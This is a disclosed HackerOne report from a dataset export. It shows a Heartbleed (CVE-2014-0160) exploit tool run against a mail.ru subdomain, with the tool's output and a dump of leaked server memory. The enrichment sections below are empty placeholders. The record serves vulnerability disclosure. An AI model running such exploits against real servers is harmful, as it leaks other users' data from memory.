---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '49139'
original_report_id: '49139'
title: 'scfbp.tng.mail.ru: Heartbleed'
weakness: Information Disclosure
team_handle: mailru
created_at: '2015-02-25T07:49:11.753Z'
disclosed_at: '2015-09-13T12:16:27.816Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# scfbp.tng.mail.ru: Heartbleed

## Metadata

- HackerOne Report ID: 49139
- Weakness: Information Disclosure
- Program: mailru
- Disclosed At: 2015-09-13T12:16:27.816Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

MacBook-Pro-Kirill:Pentest isox$ python heartbleed.py scfbp.tng.mail.ru

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: scfbp.tng.mail.ru:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: scfbp.tng.mail.ru:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.........Y.[.uu.n.~J....4.F.P.<.5}b.n
.................................3t.............http/1.1.spdy/3.1.h2-14uP.........
.............WXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1
Host: 195.211.20.229
Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
